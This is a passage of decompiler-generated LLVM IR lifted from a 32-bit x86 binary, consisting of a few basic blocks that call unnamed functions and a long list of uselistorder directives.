dec_label_pc_8049f6a.dec_label_pc_80483a7_crit_edge: ; preds = %dec_label_pc_8049f6a
  %v0_80483a9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80483a7

dec_label_pc_8049f8f:                             ; preds = %dec_label_pc_8049f6a
  %v1_8049f8f = add i32 %v0_8049f82, 20756
  store i32 %v1_8049f8f, i32* %edx.global-to-local, align 4
  %v1_8049f96 = add i32 %v0_8049f82, 64
  %v2_8049f96 = inttoptr i32 %v1_8049f96 to i32*
  %v3_8049f96 = load i32, i32* %v2_8049f96, align 4
  store i32 %v3_8049f96, i32* %eax.global-to-local, align 4
  %v2_8049f9a = add i32 %v0_8049f82, 40
  %v3_8049f9a = inttoptr i32 %v2_8049f9a to i32*
  store i32 %v1_8049f8f, i32* %v3_8049f9a, align 4
  %v0_8049f9e = load i32, i32* @esp, align 4
  %v1_8049f9e = add i32 %v0_8049f9e, 48
  %v2_8049f9e = inttoptr i32 %v1_8049f9e to i32*
  %v3_8049f9e = load i32, i32* %v2_8049f9e, align 4
  %v1_8049fa2 = add i32 %v0_8049f9e, 20612
  store i32 %v1_8049fa2, i32* %ecx.global-to-local, align 4
  %v0_8049fa9 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fa9 = add i32 %v0_8049fa9, 16
  store i32 %v1_8049fa9, i32* %eax.global-to-local, align 4
  %v1_8049fac = add i32 %v3_8049f9e, 1452
  %v9_8049fac = icmp eq i32 %v1_8049fac, 0
  store i1 %v9_8049fac, i1* %zf.global-to-local, align 1
  store i32 %v1_8049fac, i32* %edx.global-to-local, align 4
  %v2_8049fb2 = add i32 %v0_8049f9e, 20
  %v3_8049fb2 = inttoptr i32 %v2_8049fb2 to i32*
  store i32 %v1_8049fa2, i32* %v3_8049fb2, align 4
  %v0_8049fb6 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049fb6 = load i32, i32* @esp, align 4
  %v2_8049fb6 = add i32 %v1_8049fb6, 28
  %v3_8049fb6 = inttoptr i32 %v2_8049fb6 to i32*
  store i32 %v0_8049fb6, i32* %v3_8049fb6, align 4
  %v0_8049fba = load i32, i32* %edx.global-to-local, align 4
  %v1_8049fba = load i32, i32* @esp, align 4
  %v2_8049fba = add i32 %v1_8049fba, 32
  %v3_8049fba = inttoptr i32 %v2_8049fba to i32*
  store i32 %v0_8049fba, i32* %v3_8049fba, align 4
  %v0_80484e5.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80484e5.preheader

dec_label_pc_8049fc3:                             ; preds = %dec_label_pc_804848a
  %v9_8049fc3 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049fc3, i1* %zf.global-to-local, align 1
  %v1_8049fc6 = add i32 %v0_80484a0, -16
  %v2_8049fc6 = inttoptr i32 %v1_8049fc6 to i32*
  store i32 48, i32* %v2_8049fc6, align 4
  %v2_8049fc8 = call i32 @function_80512a0(i8 %v1_8049f3f)
  store i32 %v2_8049fc8, i32* %eax.global-to-local, align 4
  %v0_8049fcd = load i32, i32* @esp, align 4
  %v1_8049fcd = inttoptr i32 %v0_8049fcd to i32*
  %v2_8049fcd = load i32, i32* %v1_8049fcd, align 4
  store i32 %v2_8049fcd, i32* @ebx, align 4
  %v3_8049fcd = add i32 %v0_8049fcd, 4
  %v1_8049fce = inttoptr i32 %v3_8049fcd to i32*
  store i32 0, i32* %v1_8049fce, align 4
  store i32 48, i32* %v1_8049fcd, align 4
  %v3_8049fd3 = call i32 @function_80511f0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_8049fd3, i32* %eax.global-to-local, align 4
  %v0_8049fd8 = load i32, i32* @esp, align 4
  %v1_8049fd8 = inttoptr i32 %v0_8049fd8 to i32*
  %v2_8049fd8 = load i32, i32* %v1_8049fd8, align 4
  store i32 %v2_8049fd8, i32* %edx.global-to-local, align 4
  %v3_8049fd8 = add i32 %v0_8049fd8, 4
  %v1_8049fd9 = inttoptr i32 %v3_8049fd8 to i32*
  %v2_8049fd9 = load i32, i32* %v1_8049fd9, align 4
  store i32 %v2_8049fd9, i32* %ecx.global-to-local, align 4
  store i32 %v3_8049fd3, i32* %v1_8049fd9, align 4
  %v0_8049fdb = load i32, i32* @esi, align 4
  %v1_8049fdb = add i32 %v0_8049fdb, 20
  store i32 %v1_8049fdb, i32* %eax.global-to-local, align 4
  store i32 %v1_8049fdb, i32* %v1_8049fd8, align 4
  %v3_8049fdf = call i32 @function_8051c10(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049fdf, i32* %eax.global-to-local, align 4
  %v0_8049fe4 = load i32, i32* @esp, align 4
  %v1_8049fe4 = inttoptr i32 %v0_8049fe4 to i32*
  store i32 48, i32* %v1_8049fe4, align 4
  %v2_8049feb = call i32 @function_8051220(i8 %v1_8049f3f)
  store i32 %v2_8049feb, i32* %eax.global-to-local, align 4
  %v0_8049ff0 = load i32, i32* @esp, align 4
  %v1_8049ff0 = add i32 %v0_8049ff0, 16
  %v6_8049ff0 = icmp eq i32 %v1_8049ff0, 0
  store i1 %v6_8049ff0, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_8049ff8:                             ; preds = %dec_label_pc_804848a
  %v9_8049ff8 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_8049ff8, i1* %zf.global-to-local, align 1
  %v1_8049ffb = add i32 %v0_80484a0, -16
  %v2_8049ffb = inttoptr i32 %v1_8049ffb to i32*
  store i32 49, i32* %v2_8049ffb, align 4
  %v2_8049ffd = call i32 @function_80512a0(i8 %v1_8049f3f)
  store i32 %v2_8049ffd, i32* %eax.global-to-local, align 4
  %v0_804a002 = load i32, i32* @esp, align 4
  %v1_804a002 = inttoptr i32 %v0_804a002 to i32*
  %v2_804a002 = load i32, i32* %v1_804a002, align 4
  store i32 %v2_804a002, i32* @ebx, align 4
  %v3_804a002 = add i32 %v0_804a002, 4
  %v1_804a003 = inttoptr i32 %v3_804a002 to i32*
  store i32 0, i32* %v1_804a003, align 4
  store i32 49, i32* %v1_804a002, align 4
  %v3_804a008 = call i32 @function_80511f0(i32 %tmp, i32* nonnull @0)
  store i32 %v3_804a008, i32* %eax.global-to-local, align 4
  %v0_804a00d = load i32, i32* @esp, align 4
  %v1_804a00d = inttoptr i32 %v0_804a00d to i32*
  %v2_804a00d = load i32, i32* %v1_804a00d, align 4
  store i32 %v2_804a00d, i32* %edx.global-to-local, align 4
  %v3_804a00d = add i32 %v0_804a00d, 4
  %v1_804a00e = inttoptr i32 %v3_804a00d to i32*
  %v2_804a00e = load i32, i32* %v1_804a00e, align 4
  store i32 %v2_804a00e, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a008, i32* %v1_804a00e, align 4
  %v0_804a010 = load i32, i32* @esi, align 4
  %v1_804a010 = add i32 %v0_804a010, 20
  store i32 %v1_804a010, i32* %eax.global-to-local, align 4
  store i32 %v1_804a010, i32* %v1_804a00d, align 4
  %v3_804a014 = call i32 @function_8051c10(i8* %v2_8049f7d, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_804a014, i32* %eax.global-to-local, align 4
  %v0_804a019 = load i32, i32* @esp, align 4
  %v1_804a019 = inttoptr i32 %v0_804a019 to i32*
  store i32 49, i32* %v1_804a019, align 4
  %v2_804a020 = call i32 @function_8051220(i8 %v1_8049f3f)
  store i32 %v2_804a020, i32* %eax.global-to-local, align 4
  %v0_804a025 = load i32, i32* @esp, align 4
  %v1_804a025 = add i32 %v0_804a025, 16
  %v6_804a025 = icmp eq i32 %v1_804a025, 0
  store i1 %v6_804a025, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

dec_label_pc_804a062:                             ; preds = %dec_label_pc_804848a
  %v9_804a062 = icmp eq i32 %v0_80484a0, 12
  store i1 %v9_804a062, i1* %zf.global-to-local, align 1
  %v1_804a065 = add i32 %v0_80484a0, -16
  %v2_804a065 = inttoptr i32 %v1_804a065 to i32*
  store i32 50, i32* %v2_804a065, align 4
  %v2_804a067 = call i32 @function_80512a0(i8 86)
  store i32 %v2_804a067, i32* %eax.global-to-local, align 4
  %v0_804a06c = load i32, i32* @esp, align 4
  %v1_804a06c = inttoptr i32 %v0_804a06c to i32*
  %v2_804a06c = load i32, i32* %v1_804a06c, align 4
  store i32 %v2_804a06c, i32* @ebx, align 4
  %v3_804a06c = add i32 %v0_804a06c, 4
  %v1_804a06d = inttoptr i32 %v3_804a06c to i32*
  store i32 0, i32* %v1_804a06d, align 4
  store i32 50, i32* %v1_804a06c, align 4
  %v3_804a072 = call i32 @function_80511f0(i32 134564438, i32* %v2_804a072)
  store i32 %v3_804a072, i32* %eax.global-to-local, align 4
  %v0_804a077 = load i32, i32* @esp, align 4
  %v1_804a077 = inttoptr i32 %v0_804a077 to i32*
  %v2_804a077 = load i32, i32* %v1_804a077, align 4
  store i32 %v2_804a077, i32* %edx.global-to-local, align 4
  %v3_804a077 = add i32 %v0_804a077, 4
  %v1_804a078 = inttoptr i32 %v3_804a077 to i32*
  %v2_804a078 = load i32, i32* %v1_804a078, align 4
  store i32 %v2_804a078, i32* %ecx.global-to-local, align 4
  store i32 %v3_804a072, i32* %v1_804a078, align 4
  %v0_804a07a = load i32, i32* @esi, align 4
  %v1_804a07a = add i32 %v0_804a07a, 20
  store i32 %v1_804a07a, i32* %eax.global-to-local, align 4
  store i32 %v1_804a07a, i32* %v1_804a077, align 4
  %v3_804a07e = call i32 @function_8051c10(i8* inttoptr (i32 134564438 to i8*), i32 %v0_804816e)
  store i32 %v3_804a07e, i32* %eax.global-to-local, align 4
  %v0_804a083 = load i32, i32* @esp, align 4
  %v1_804a083 = inttoptr i32 %v0_804a083 to i32*
  store i32 50, i32* %v1_804a083, align 4
  %v2_804a08a = call i32 @function_8051220(i8 86)
  store i32 %v2_804a08a, i32* %eax.global-to-local, align 4
  %v0_804a08f = load i32, i32* @esp, align 4
  %v1_804a08f = add i32 %v0_804a08f, 16
  %v6_804a08f = icmp eq i32 %v1_804a08f, 0
  store i1 %v6_804a08f, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8049f6a

; uselistorder directives
  uselistorder i32 %v1_804a08f, { 1, 0 }
  uselistorder i32 %v2_804a08a, { 1, 0 }
  uselistorder i32 %v1_804a025, { 1, 0 }
  uselistorder i32 %v2_804a020, { 1, 0 }
  uselistorder i32 %v1_8049ff0, { 1, 0 }
  uselistorder i32 %v2_8049feb, { 1, 0 }
  uselistorder i1 %v15_8049f85, { 1, 0 }
  uselistorder i32 %v1_8049f6a, { 0, 1, 2, 5, 4, 3 }
  uselistorder i1 %v14_8049f0e, { 1, 0 }
  uselistorder i32 %v1_8049f0b, { 1, 0 }
  uselistorder i32 %v0_8049f0b, { 1, 0, 2 }
  uselistorder i32 %v2_8049f06, { 0, 2, 1 }
  uselistorder i32 %v0_8049eff, { 1, 0 }
  uselistorder i8 %v2_8049edb, { 1, 2, 0 }
  uselistorder i32 %v0_8049edb, { 1, 0 }
  uselistorder i1 %v10_8049ec8, { 1, 0 }
  uselistorder i1 %v10_8049eb8, { 1, 0 }
  uselistorder i32 %v0_8049eac, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8049ea9, { 1, 0 }
  uselistorder i32 %v1_8049e91, { 1, 0 }
  uselistorder i1 %v12_8049e75, { 1, 0 }
  uselistorder i32 %v2_8049e2f, { 1, 0 }
  uselistorder i32 %v1_8049e03, { 1, 0, 2 }
  uselistorder i32 %v2_8049dd6, { 1, 0 }
  uselistorder i32 %v2_8049dc2, { 1, 0 }
  uselistorder i32 %v1_8049daf, { 1, 0 }
  uselistorder i32 %v0_8049dac, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049da7, { 1, 4, 0, 3, 2, 5 }
  uselistorder i32 %v1_8049d8b, { 1, 0 }
  uselistorder i32 %v0_8049d6b, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8049d36, { 1, 0 }
  uselistorder i32 %v0_8049d33, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049d2e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049d04, { 1, 0 }
  uselistorder i32 %v0_8049d01, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049cfc, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32 %v0_8049cf1, { 1, 0, 2 }
  uselistorder i32 %v0_8049ce8, { 1, 0 }
  uselistorder i32 %v1_8049cd5, { 1, 0 }
  uselistorder i32 %v2_8049ccd, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v0_8049cb2, { 1, 0, 2 }
  uselistorder i32 %v9_8049c6e, { 1, 0 }
  uselistorder i32 %v5_8049c66, { 1, 2, 0 }
  uselistorder i32 %v0_8049c5b, { 1, 2, 0 }
  uselistorder i32 %v1_8049c29, { 1, 0 }
  uselistorder i32 %v1_8049c14, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v1_8049c09, { 1, 0 }
  uselistorder i32 %v2_8049c04, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049bd4, { 1, 0 }
  uselistorder i32 %v0_8049bd1, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049bcc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8049ba2, { 1, 0 }
  uselistorder i32 %v0_8049b9f, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v2_8049b9a, { 4, 3, 0, 2, 1, 5 }
  uselistorder i32 %v0_8049b8f, { 1, 0, 2 }
  uselistorder i32 %v0_8049b86, { 1, 0 }
  uselistorder i8 %v2_8049b80, { 1, 2, 0 }
  uselistorder i32 %v0_8049b80, { 1, 0 }
  uselistorder i1 %v10_8049b6d, { 1, 0 }
  uselistorder i1 %v10_8049b5d, { 1, 0 }
  uselistorder i32 %v0_8049b52, { 1, 0, 2, 3 }
  uselistorder i1 %v12_8049b28, { 1, 0 }
  uselistorder i1 %v11_8049b0f, { 1, 0 }
  uselistorder i32 %v4_8049ae5, { 1, 0 }
  uselistorder i32 %v0_8049aa9, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v0_8049aa4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8049a90, { 1, 0, 2 }
  uselistorder i32 %v0_8049a77, { 5, 4, 3, 2, 1, 0 }
  uselistorder i1 %v11_8049a40, { 1, 0 }
  uselistorder i1 %v9_8049a37, { 1, 0 }
  uselistorder i32 %v1_8049a34, { 1, 0 }
  uselistorder i32 %v0_8049a25, { 1, 2, 3, 0 }
  uselistorder i32 %v0_8049a0a, { 1, 0 }
  uselistorder i32 %v0_80499fd, { 1, 0 }
  uselistorder i32 %v3_80499d9, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80499d4, { 3, 2, 1, 0 }
  uselistorder i1 %v13_80499ca, { 1, 0 }
  uselistorder i32 %v3_80499c3, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804997c, { 1, 0, 2 }
  uselistorder i1 %v10_8049944, { 1, 0 }
  uselistorder i32 %v0_8049944, { 1, 0 }
  uselistorder i32 %v1_80498e7, { 1, 0 }
  uselistorder i1 %v10_80498d9, { 1, 0 }
  uselistorder i32 %v0_80498cf, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v0_80498a0, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_804988a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049875, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804985f, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v5_8049845, { 1, 2, 0 }
  uselistorder i32 %v1_8049845, { 1, 0 }
  uselistorder i32 %v3_804983f, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_8049834, { 1, 0 }
  uselistorder i32 %v1_8049831, { 1, 0 }
  uselistorder i32 %v0_80497f9, { 1, 2, 0 }
  uselistorder i1 %v11_80497f0, { 1, 0 }
  uselistorder i32 %v1_80497ab, { 1, 0 }
  uselistorder i32 %v5_804978f, { 1, 2, 0 }
  uselistorder i32 %v1_804978f, { 1, 0 }
  uselistorder i32 %v3_8049789, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_804977e, { 1, 0 }
  uselistorder i32 %v1_804977b, { 1, 0 }
  uselistorder i32 %v1_804974f, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804970b, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80496ee, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v4_80496b9, { 1, 0 }
  uselistorder i32 %v0_80496b5, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8049679, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8049628, { 0, 2, 1 }
  uselistorder i32 %v1_8049605, { 0, 1, 4, 3, 2 }
  uselistorder i1 %v9_80495f5, { 1, 0 }
  uselistorder i1 %v12_80495e4, { 1, 0 }
  uselistorder i32 %v0_80495e0, { 0, 2, 1 }
  uselistorder i32 %v3_80495d1, { 3, 7, 8, 4, 5, 1, 0, 2, 6 }
  uselistorder i32 %v0_8049542, { 1, 0 }
  uselistorder i1 %v12_8049581, { 1, 0 }
  uselistorder i1 %v12_804956d, { 1, 0 }
  uselistorder i32 %v0_8049562, { 3, 2, 1, 0, 4 }
  uselistorder i1 %v11_8049559, { 1, 0 }
  uselistorder i32 %v2_804954a, { 1, 2, 0 }
  uselistorder i32 %v3_8049542, { 1, 2, 0, 3, 4 }
  uselistorder i1 %v10_8049518, { 1, 0 }
  uselistorder i1 %v9_80494cc, { 1, 0 }
  uselistorder i32 %v0_80494b4, { 1, 0, 2, 3 }
  uselistorder i1 %v11_8049496, { 1, 0 }
  uselistorder i1 %v9_804948d, { 1, 0 }
  uselistorder i32 %v0_804948a, { 5, 1, 2, 3, 4, 0, 6 }
  uselistorder i32 %v1_8049465, { 0, 2, 1 }
  uselistorder i1 %v10_8049457, { 1, 0 }
  uselistorder i32 %v0_804944d, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_804941e, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049408, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_80493f3, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_80493dd, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v5_80493c3, { 1, 2, 0 }
  uselistorder i32 %v1_80493c3, { 1, 0 }
  uselistorder i32 %v3_80493bd, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v2_80493b2, { 1, 0 }
  uselistorder i32 %v1_80493af, { 1, 0 }
  uselistorder i32 %v2_8049377, { 1, 0 }
  uselistorder i32 %v1_8049364, { 1, 0 }
  uselistorder i32 %v0_8049361, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_804935c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8049358, { 1, 0 }
  uselistorder i32 %v5_8049353, { 1, 2, 0 }
  uselistorder i32 %v4_8049353, { 0, 2, 1 }
  uselistorder i32 %v2_8049322, { 1, 0 }
  uselistorder i32 %v2_80492f7, { 1, 2, 0 }
  uselistorder i32 %v3_80492ed, { 0, 1, 3, 4, 2 }
  uselistorder i32* %v2_80492ed, { 0, 2, 1 }
  uselistorder i32 %v0_80492e4, { 1, 0 }
  uselistorder i32 %v0_80492bf, { 0, 2, 1 }
  uselistorder i32 %v0_8049297, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_8049286, { 1, 0 }
  uselistorder i1 %v10_804926b, { 1, 0 }
  uselistorder i32 %v0_8049266, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v0_8049261, { 2, 3, 0, 1, 4, 5 }
  uselistorder i1 %v11_804923f, { 1, 0 }
  uselistorder i32 %v0_8049226, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8049211, { 1, 0 }
  uselistorder i32 %v0_8049203, { 3, 0, 1, 2, 8, 4, 5, 6, 7 }
  uselistorder i32 %v0_80491eb, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v1_80491e0, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80491b3, { 0, 2, 1 }
  uselistorder i1 %v10_80491a9, { 1, 0 }
  uselistorder i32 %v0_804919f, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_8049170, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_804915a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049145, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v0_804912f, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_8049124, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8049107, { 1, 2, 3, 0 }
  uselistorder i32 %v1_80490de, { 0, 2, 1 }
  uselistorder i1 %v10_80490d4, { 1, 0 }
  uselistorder i32 %v0_80490ca, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_804909b, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8049085, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049070, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_804905a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8049027, { 1, 2, 3, 0 }
  uselistorder i32 %v1_8048ffe, { 0, 2, 1 }
  uselistorder i1 %v10_8048ff4, { 1, 0 }
  uselistorder i32 %v0_8048fea, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 %v0_8048fbb, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 %v0_8048fa5, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8048f90, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_8048f7a, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v0_8048f3e, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v1_8048f33, { 3, 2, 1, 0 }
  uselistorder i32 %v0_8048f0d, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %v2_8049ae5, { 1, 0 }
  uselistorder i32 %v0_8048ed7, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8048e4a, { 1, 2, 0 }
  uselistorder i32 %v0_8048e05, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %v0_8048ddc, { 2, 0, 1 }
  uselistorder i32 %v1_8048dd9, { 1, 0 }
  uselistorder i32 %v2_8048dd6, { 1, 0 }
  uselistorder i1 %v10_8048dcd, { 1, 0 }
  uselistorder i32 %v3_8048dc7, { 1, 0, 2, 4, 3 }
  uselistorder i1 %v15_8048dab, { 1, 0 }
  uselistorder i32 %v0_8048da7, { 2, 1, 3, 4, 0 }
  uselistorder i1 %v10_8048d89, { 1, 0 }
  uselistorder i1 %v10_8048d81, { 1, 0 }
  uselistorder i1 %v10_8048d79, { 1, 0 }
  uselistorder i32 %v1_8048d5d, { 1, 0 }
  uselistorder i32 %v2_8048d5a, { 1, 0 }
  uselistorder i32 %v0_8048d58, { 1, 0 }
  uselistorder i32 %v1_8048e7a, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v0_8048d26, { 1, 0 }
  uselistorder i32 %v0_8048cff, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 %v5_8048cce, { 1, 2, 0 }
  uselistorder i32 %v0_8048cce, { 1, 0 }
  uselistorder i32 %v3_8048cc8, { 0, 2, 3, 1 }
  uselistorder i32 %v2_8048cbd, { 1, 0 }
  uselistorder i32 %v1_8048cba, { 1, 0 }
  uselistorder i32 %v0_8048c9d, { 0, 2, 1 }
  uselistorder i32 %v5_8048c82, { 1, 2, 0 }
  uselistorder i32 %v3_8048c7c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_8048c71, { 1, 0 }
  uselistorder i32 %v2_8048c6e, { 1, 0 }
  uselistorder i32 %v1_8048c6b, { 1, 0 }
  uselistorder i32 %v0_8048c28, { 2, 1, 0 }
  uselistorder i32 %v0_8048c1d, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v1_8048c10, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8048bdb, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_8048bb4, { 2, 1, 0 }
  uselistorder i32 %v0_8048b8a, { 2, 1, 0 }
  uselistorder i32 %v5_8048b85, { 1, 2, 0 }
  uselistorder i32 %v4_8048b85, { 0, 2, 1 }
  uselistorder i32 %v0_8048b24, { 2, 1, 0 }
  uselistorder i32 %v0_8048ae3, { 1, 3, 2, 0 }
  uselistorder i32 %v0_8048a9b, { 2, 0, 1, 3 }
  uselistorder i32 %v0_80489b5, { 1, 0, 2, 3 }
  uselistorder i32 %v5_80486da, { 1, 2, 0 }
  uselistorder i32 %v3_80486d4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_80486c6, { 1, 0 }
  uselistorder i32 %v1_80486c3, { 1, 0 }
  uselistorder i32 %v12_804862d, { 1, 0 }
  uselistorder i32 %v0_804862a, { 2, 0, 1 }
  uselistorder i1 %v10_8048616, { 1, 0 }
  uselistorder i32 %v3_8048608, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8048601, { 3, 2, 1, 0 }
  uselistorder i32 %v1_8048601.pre, { 1, 2, 0 }
  uselistorder i1 %v10_80485f0, { 1, 0 }
  uselistorder i32 %v3_80485ea, { 1, 0, 2 }
  uselistorder i1 %v10_80485ae, { 1, 0 }
  uselistorder i1 %v6_80485ae, { 1, 0 }
  uselistorder i8 %v3_80485a5, { 5, 6, 7, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_80485a5, { 0, 1, 3, 2 }
  uselistorder i32 %v0_80485a5, { 7, 6, 5, 2, 4, 0, 1, 8, 3 }
  uselistorder i1 %v15_804859b, { 1, 0 }
  uselistorder i32 %v0_8048597, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v10_8048557, { 1, 0 }
  uselistorder i1 %v10_804854f, { 1, 0 }
  uselistorder i1 %v10_8048547, { 1, 0 }
  uselistorder i1 %v10_804853f, { 1, 0 }
  uselistorder i1 %v10_8048537, { 1, 0 }
  uselistorder i32 %v3_8048505, { 1, 0 }
  uselistorder i32 %v3_80484fc, { 1, 0 }
  uselistorder i32 %v0_80484e5, { 1, 0 }
  uselistorder i8* %v1_8048752, { 21, 20, 25, 5, 4, 3, 2, 1, 0, 31, 30, 29, 28, 27, 26, 43, 42, 41, 38, 37, 40, 39, 36, 35, 24, 23, 22, 33, 32, 19, 18, 17, 16, 79, 6, 8, 7, 34, 15, 47, 46, 45, 44, 14, 49, 48, 13, 52, 51, 50, 12, 55, 54, 53, 11, 10, 9, 78, 76, 77, 80, 81, 72, 73, 68, 69, 70, 71, 74, 75, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
  uselistorder i32* %v1_80484ea, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-20924.0.ph, { 13, 17, 16, 14, 12, 11, 28, 27, 26, 25, 24, 15, 10, 18, 9, 19, 8, 21, 20, 7, 23, 22, 6, 5, 4, 2, 3, 42, 41, 40, 39, 38, 35, 34, 32, 31, 30, 29, 1, 33, 44, 43, 37, 36, 0 }
  uselistorder i32 %v2_80484ac, { 1, 2, 0, 3 }
  uselistorder i32 %v0_80484a0, { 8, 3, 7, 2, 6, 1, 4, 5, 0, 9 }
  uselistorder i8 %tmp242, { 1, 0 }
  uselistorder i32 %v1_804841e, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80483ff, { 1, 2, 3, 4, 0 }
  uselistorder i1 %v12_80483e9, { 1, 0 }
  uselistorder i32 %v0_80483e6, { 2, 1, 0, 3 }
  uselistorder i8 %v1_8049f3f, { 1, 0, 3, 2, 4, 5 }
  uselistorder i8* %v2_8049f7d, { 0, 1, 3, 2 }
  uselistorder i8* %v2_80483e1, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 %.v0_80482dd, { 5, 3, 4, 0, 1, 2 }
  uselistorder i32 %v2_80482a5, { 1, 0, 2 }
  uselistorder i32 %v4_80482a0, { 1, 2, 0 }
  uselistorder i32 %v1_80482d3, { 2, 3, 1, 0 }
  uselistorder i8* %v3_80482a0.pre, { 1, 2, 0 }
  uselistorder i8 %v1_80482c3, { 1, 0 }
  uselistorder i32 %v1_804828d, { 1, 0 }
  uselistorder i32 %v2_8048285, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v1_8048278, { 1, 0 }
  uselistorder i32 %v2_8048270, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_804824e, { 1, 2, 0, 3 }
  uselistorder i1 %v9_8048246, { 1, 0, 2, 3, 4 }
  uselistorder i8* %tmp237, { 0, 2, 1 }
  uselistorder i32 %v6_80481f3, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v5_80481e1, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v6_80481cf, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-20972, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 %tmp, { 4, 3, 1, 0, 2, 5 }
